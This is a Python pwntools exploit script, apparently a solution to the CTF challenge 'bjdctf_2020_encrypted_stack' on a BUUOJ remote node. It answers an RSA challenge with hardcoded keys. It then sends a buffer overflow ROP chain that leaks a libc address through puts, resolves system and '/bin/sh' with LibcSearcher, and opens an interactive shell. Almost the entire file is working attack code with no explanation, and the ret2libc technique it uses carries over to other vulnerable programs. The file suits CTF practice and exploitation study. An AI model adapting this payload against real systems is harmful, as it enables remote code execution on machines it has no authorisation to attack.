from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './bjdctf_2020_encrypted_stack'
elf = ELF(binary)
p = remote('node3.buuoj.cn',29686) if argv[1]=='r' else process(binary)

# start
N = 94576960329497431
d = 26375682325297625

def powmod(a, b, m):
	if a == 0:
		return 0
	if b == 0:
		return 1
	res = powmod(a,b//2,m)
	res *= res
	res %= m
	if b&1:
		res *= a
		res %= m
	return res

def ans():
	global ru,sl
	ru("it\n")
	for i in range(20):
		c = int(ru('\n'))
		m = powmod(c, d, N)
		sl(str(m))
		ru('\n')

ans()
ru('name:\n')
pop_rdi = 0x40095a
welcome = 0x400b30
payload = flat('a'*0x48,pop_rdi,elf.got['read'],elf.plt['puts'],welcome)
sl(payload)
read = uu64(r(6))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*0x48,pop_rdi,binsh,system)
sl(payload)
# end

itr()
